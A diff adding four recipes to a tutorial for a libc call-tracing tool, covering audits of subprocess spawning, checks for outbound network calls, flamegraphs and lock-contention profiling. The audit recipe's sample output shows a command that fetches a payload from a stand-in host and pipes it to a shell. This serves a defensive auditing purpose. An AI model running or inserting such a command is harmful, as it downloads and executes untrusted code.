@@ -24,6 +24,10 @@ Pick the one that matches your situation.
 12. [Audit what environment variables a binary reads](#12-audit-what-environment-variables-a-binary-reads)
 13. [Capture all network traffic as JSON](#13-capture-all-network-traffic-as-json)
 14. [Trace a statically-linked binary](#14-trace-a-statically-linked-binary)
+15. [Audit system() and execve() calls](#15-audit-system-and-execve-calls)
+16. [Verify a binary makes no outbound network calls](#16-verify-a-binary-makes-no-outbound-network-calls)
+17. [Generate a flamegraph of libc calls](#17-generate-a-flamegraph-of-libc-calls)
+18. [Profile lock contention](#18-profile-lock-contention)
 
 ---
 
@@ -617,6 +621,161 @@ Reserve it for static binaries; use preload everywhere else.
 
 See `src/backends/ptrace/README.md` for the full ptrace backend
 reference.
+
+---
+
+## 15. Audit system() and execve() calls
+
+**Time:** 3 minutes.
+**Goal:** find every shell command and subprocess a binary spawns — critical for setuid and CGI audits.
+
+### Step 1 — trace process-spawning libc calls
+
+```sh
+retrace trace system,popen,execve,execvp,execl --log /tmp/exec.json -- ./your-binary
+```
+
+Every subprocess invocation is captured with its full argument list.
+
+### Step 2 — pretty-print
+
+```sh
+retrace pp /tmp/exec.json
+```
+
+```
+system       3 calls
+  system(cmd=sh -c 'curl http://evil.example/payload | sh')
+  ...
+execve      12 calls
+  execve(argv=[/bin/sh, -c, ...])
+  ...
+```
+
+### Step 3 — triage
+
+Any `system()` call with shell metacharacters, user-controlled
+input, or absolute paths to `/tmp` is a finding. CWE-78 (OS Command
+Injection).
+
+If the binary is setuid or runs as a server, every finding is
+potentially exploitable. File a CVE-worthy report.
+
+---
+
+## 16. Verify a binary makes no outbound network calls
+
+**Time:** 4 minutes.
+**Goal:** confirm a binary is genuinely offline — no telemetry, no auto-update, no phone-home.
+
+### Step 1 — trace network calls
+
+```sh
+retrace trace connect,send,sendto,sendmsg,write --log /tmp/net.json -- ./your-binary
+```
+
+### Step 2 — check the log
+
+```sh
+retrace pp /tmp/net.json
+```
+
+If the log is empty, the binary made zero outbound calls —
+confirmed airgapped.
+
+### Step 3 — investigate unexpected connects
+
+```sh
+grep connect /tmp/net.json
+```
+
+```
+{"func":"connect","args":{"addr":"93.184.216.34:443"}, ...}  ← unexpected
+```
+
+### Step 4 — enforce going forward
+
+To enforce airgap (not just observe), pair with the `sandbox`
+action to deny `connect` outright. See tutorial #3.
+
+---
+
+## 17. Generate a flamegraph of libc calls
+
+**Time:** 5 minutes.
+**Goal:** visualize which libc calls dominate — the SVG bar chart every perf investigation needs.
+
+### Step 1 — trace with timing
+
+```sh
+retrace trace --log /tmp/trace.json -- ./your-program
+```
+
+The log will include `call_duration_us` per call.
+
+### Step 2 — generate the SVG
+
+```sh
+python3 tools/flamegraph/flamegraph.py /tmp/trace.json > /tmp/flame.svg
+```
+
+### Step 3 — open
+
+```sh
+open /tmp/flame.svg
+```
+
+Widest bars = the libc calls that consumed the most total time.
+
+### Step 4 — explore
+
+Search inside the SVG for a specific function name to find its
+slice. Click any slice to zoom.
+
+### Note
+
+Requires Python 3 only for the visualization step. The trace itself
+is pure C; the flamegraph is just one way to render the JSON log.
+
+---
+
+## 18. Profile lock contention
+
+**Time:** 4 minutes.
+**Goal:** find which mutexes your threads are fighting over — without perf or DTrace.
+
+### Step 1 — trace mutex calls
+
+```sh
+retrace trace pthread_mutex_lock,pthread_mutex_unlock --log /tmp/locks.json -- ./your-threaded-program
+```
+
+### Step 2 — per-function totals
+
+```sh
+retrace pp /tmp/locks.json | grep -E 'mutex' | head -5
+```
+
+```
+pthread_mutex_lock     842 calls   487.3ms total
+pthread_mutex_unlock   842 calls     2.1ms total
+```
+
+### Step 3 — interpret
+
+Total lock time minus total unlock time = time spent waiting. The
+function with the biggest gap is your bottleneck.
+
+```
+487.3ms - 2.1ms = 485.2ms of contention
+```
+
+Compare to total wall time to decide if it's worth fixing.
+
+### Step 4 — finer detail
+
+For which call site is contended, pair with a debugger or use the
+return-address routing pattern (cookbook recipe 17, planned).
 
 ---
 
